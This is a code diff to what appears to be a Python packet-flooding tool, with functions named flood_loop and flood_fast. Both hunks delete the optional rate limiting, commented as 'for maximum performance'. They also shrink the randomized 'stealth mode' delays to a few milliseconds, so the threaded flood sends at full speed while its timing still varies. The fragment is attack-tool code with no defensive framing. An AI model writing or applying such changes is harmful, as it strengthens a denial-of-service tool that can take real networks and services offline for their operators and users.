@@ -122,12 +122,11 @@ def flood_loop(args):
             else:
                 print(f"[-] Packet send error: {e}")
         
-        # Stealth mode: randomized delays
+        # Stealth mode: randomized delays (only if stealth enabled)
         if args.stealth:
-            delay = random.uniform(0.1, 2.0)  # Random delay 0.1-2 seconds
+            delay = random.uniform(0.01, 0.1)  # Faster random delays 0.01-0.1 seconds
             time.sleep(delay)
-        elif args.rate:
-            time.sleep(1/args.rate)
+        # No rate limiting for maximum performance - remove sleep throttling
 
     bar.close()
     
@@ -170,12 +169,11 @@ def flood_fast(args):
                     stop_evt.set()
                     break
             
-            # Apply rate limiting or stealth delays
+            # Apply stealth delays only if stealth mode enabled
             if args.stealth:
-                delay = random.uniform(0.05, 0.5)  # Faster random delays in fast mode
+                delay = random.uniform(0.001, 0.05)  # Very fast random delays in fast mode
                 time.sleep(delay)
-            elif args.rate:
-                time.sleep(1/args.rate)
+            # No rate limiting for maximum performance - remove sleep throttling
 
     workers = [threading.Thread(target=worker, daemon=True)
                for _ in range(args.threads)]
